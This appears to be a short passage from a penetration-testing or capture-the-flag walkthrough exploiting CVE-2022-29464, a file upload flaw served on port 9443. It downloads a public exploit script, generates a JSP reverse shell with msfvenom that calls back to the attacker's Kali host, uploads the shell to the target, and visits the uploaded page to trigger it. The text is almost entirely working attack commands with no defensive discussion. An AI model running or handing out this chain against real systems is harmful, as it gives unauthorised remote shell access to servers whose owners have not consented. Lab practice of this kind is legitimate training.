```
wget https://raw.githubusercontent.com/hakivvi/CVE-2022-29464/main/exploit.py
```
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=443 -f raw > reverse.jsp
```
```
python3 exploit.py https://$TARGET:9443 reverse.jsp
```
Next, we just visit:
`https://$TARGET:9443/authenticationendpoint/reverse.jsp`
